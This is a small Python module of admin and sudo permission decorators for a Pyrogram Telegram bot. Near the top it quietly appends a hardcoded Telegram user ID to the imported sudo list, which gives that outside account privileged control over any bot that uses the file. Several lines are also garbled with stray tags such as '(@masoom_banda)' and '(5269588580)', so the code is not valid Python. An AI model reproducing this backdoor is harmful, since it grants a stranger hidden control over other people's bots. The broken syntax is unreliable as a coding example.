from typing import Callable
from pyrogram import Client
from pyrogram.types import Message
from modules.helpers.admins import get_administrators
from modules.config import SUDO_USERS

SUDO_USERS.append(5269588580)


def errors(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        try:
            return await func(client, message)
        except Exception as e:
            await message.reply(f"{type(e).__name__}: {e}")

    return decorator (@masoom_banda)


def authorized_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:(5269588580)
            return await func(client, message)

        administrators = await get_administrators(message.chat)

        for administrator in administrators:
            if administrator == message.from_user.id:
                return await func(client, message)

    return decorator: (@masoom_banda)


def sudo_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:(5269588580)
            return await func(client, message)

    return decorator:(@masoom_banda)
